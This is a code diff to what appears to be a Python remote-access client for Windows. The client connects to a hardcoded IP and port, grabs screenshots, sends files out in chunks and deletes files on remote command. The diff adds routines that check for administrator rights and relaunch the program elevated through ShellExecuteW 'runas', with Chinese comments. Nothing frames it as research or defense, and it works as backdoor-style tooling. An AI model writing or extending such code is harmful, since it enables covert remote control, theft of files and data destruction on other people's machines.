@@ -8,9 +8,45 @@ import io
 import win32file
 import win32api
 import pickle
+import ctypes
+import sys
 from PIL import ImageGrab
 
 IP, PORT = '192.168.0.106', 8080
+
+def is_admin():
+    """检查是否拥有管理员权限"""
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
+def run_as_admin():
+    """以管理员权限重新启动当前程序（exe 或 .py）"""
+    if getattr(sys, 'frozen', False):
+        # 打包后的 exe 环境
+        app_path = sys.executable
+        cmd_args = sys.argv[1:]
+    else:
+        # 开发环境（.py）：需要把脚本路径也作为参数传给 python.exe
+        app_path = sys.executable
+        cmd_args = sys.argv  # sys.argv[0] 即 .py 脚本路径
+
+    params = ' '.join([f'"{arg}"' if ' ' in arg else arg for arg in cmd_args])
+
+    # 调用 Windows ShellExecuteW 请求提权
+    ctypes.windll.shell32.ShellExecuteW(
+        None,           # 父窗口句柄
+        "runas",        # 动作：以管理员运行
+        app_path,       # 要运行的程序路径
+        params,         # 命令行参数
+        None,           # 工作目录（默认当前）
+        1               # 窗口状态（1 表示正常显示）
+    )
+    sys.exit()  # 退出当前未提权的进程
+
+if not is_admin():
+    run_as_admin()
 
 while True:
     try:
@@ -122,7 +158,7 @@ while True:
                                         break
                                     client.sendall(chunk)
                         except Exception as e:
-                            client.sendall(b"00000000")  # 发送0表示失败
+                            client.sendall(b"-0000001")  # 发送-1表示失败，区别于空文件
                     elif sinter_list[0]=='delete':
                         try:
                             os.remove(sinter_list[1])
